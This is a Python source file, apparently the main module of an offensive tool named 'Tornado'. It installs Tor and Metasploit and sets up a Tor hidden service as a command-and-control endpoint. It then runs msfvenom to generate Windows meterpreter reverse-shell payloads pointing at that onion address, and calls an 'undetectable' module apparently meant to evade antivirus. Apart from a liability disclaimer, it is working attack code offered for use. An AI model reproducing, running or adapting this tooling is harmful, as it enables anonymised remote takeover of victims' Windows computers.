# running main functions

import os
import shutil
import signal
import subprocess
import sys
import time
import argparse
import stem.socket
import stem.connection
from stem.control import Controller
from importlib.metadata import version
from tornado.core import logger
from tornado.core.logger import banner, info, warn, green, reset
from tornado.core import undetectable

class T0rnado():
    def __init__(self):
        self.samogod = ':x samet-g :x'
        self.version = version('tornado')

    '''def download_tor(self):
        tor_url = 'https://www.torproject.org/dist/torbrowser/11.0.10/tor-win32-0.4.6.10.zip'
        wget.download(tor_url, out='C:')
        logger.infot('Tor is downloaded in C:\\ directory.')
        try:
            with zipfile.ZipFile('C:\\tor-win32-0.4.6.10.zip', 'r') as tor:
                os.path.join("C:")
                tor.extractall('C:\\')
                logger.info('Tor is unzipped in C: disk.')
        except:
            logger.error('Tor is not unzipped in C: disk.\nRun tornado as administrator.')
        pathlib.Path('C:\\tor-win32-0.4.6.10.zip').unlink()
        shutil.rmtree('C:\\Data')
        logger.info('Compressed tor file is gone.')'''

    def startup(self):
        print(banner)
        logger.info(f'Tornado Engine ({green}v{self.version}{reset}) is initialising..')
        if os.name == 'nt':
            logger.error('Tornado doesn\'t have Windows Support for now.')
            logger.error('Run it with WSL technology or Linux machine.')
            logger.error('Any contributions you make are greatly appreciated especially Windows Integration to github.com/samet-g/tornado')
        else:
            logger.warn('Use with caution. You are responsible for your actions.')
            logger.warn('Developers assume no liability and are not responsible for any misuse or damage.')

    def install(self):
        req = subprocess.call(['which', 'tor'], stdout=subprocess.PIPE)
        if req:
            logger.info('Tor is downloading..')
            subprocess.run(['sudo', 'apt-get', 'update'], stdout=subprocess.PIPE)
            subprocess.run(['sudo', 'apt-get', 'install', 'tor'], stdout=subprocess.PIPE)
        else:
            logger.good('Tor is started.')
            subprocess.run(['tor', '--quiet', '&'], stdout=subprocess.PIPE)
        requ = subprocess.call(['which', 'msfvenom'], stdout=subprocess.PIPE)
        if requ:
            logger.info('Metasploit Framework is downloading..')
            subprocess.run(['sudo', 'apt-get', 'update'], stdout=subprocess.PIPE)
            subprocess.run(['sudo', 'apt-get', 'install', 'metasploit-framework'])
        else:
            logger.good('Metasploit Framework is started.')

    def connection(self):
        os.system("tor --quiet &")
        time.sleep(8)
        with Controller.from_port() as controller:
            controller.authenticate()
            logger.infot(f'Tor is running version {controller.get_version()}')
            logger.infot('Creating hidden service in hidden_service folder..')
            hidden_service = os.path.join(controller.get_conf('DataDirectory', os.getcwd()), 'hidden_service')
            result = controller.create_hidden_service(path=hidden_service, port=80, target_port=1235)
            if result.hostname:
                logger.good(f'Service is available at {result.hostname}')
                tor2web = result.hostname + ".to"
                self.shell(tor2web)

    def shell(host):
        logger.input('What payload do you need: [tcp-https-http-ipv6_tcp]:')
        payload = input()
        payload = payload or "tcp"

        logger.input('Enter arch: [x86--x64] [default: x64]')
        arch = input()
        arch = arch or "x64"

        logger.infot(f'Payload: {payload}')
        logger.infot(f'Arch: {arch}')
        logger.infot(f'Onion Adress: {host}:80')

        logger.infot('Generating payload..')

        if arch == "x64":
            os.system(
                f"/usr/bin/msfvenom -p windows/x64/meterpreter_reverse_{payload} LHOST={host} LPORT=80 EXITFUNC=process --platform windows -a {arch} -f raw -o tornado.raw")

        if arch == "x86":
            os.system(
                f"/usr/bin/msfvenom -p windows/meterpreter_reverse_{payload} LHOST={host} LPORT=80 --platform windows -a x86 -f raw -o tornado.raw")

    def kill(self):
        logger.info('Tor service is running before start - Tor service is killing..')
        try:
            os.kill(int(subprocess.check_output(["pidof", "tor"])), signal.SIGTERM)
            logger.goodt('Running tor service is killed.')
        except:
            logger.errort('Tor service is not killed.')

    def process(self):
        self.startup()
        self.install()
        try:
            self.kill()
        except:
            pass
        self.connection() # + self.shell(tor2web)
        undetectable.slayer()
        undetectable.compile()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-start", "--start", action='store_true',
                              help="start tornado: `sudo tornado -start`"),
    args = parser.parse_args()

    def check_privileges():
        if not os.environ.get("SUDO_UID") and os.geteuid() != 0:
            print(banner)
            logger.errort('You need to run tornado with sudo or as root.')
            #raise PermissionError("You need to run this script with sudo or as root.")

    if args.start:
        if check_privileges():
            sys.exit(1)
        else:
            tornado = T0rnado()
            tornado.process()
    else:
        print(banner)
        parser.print_help()


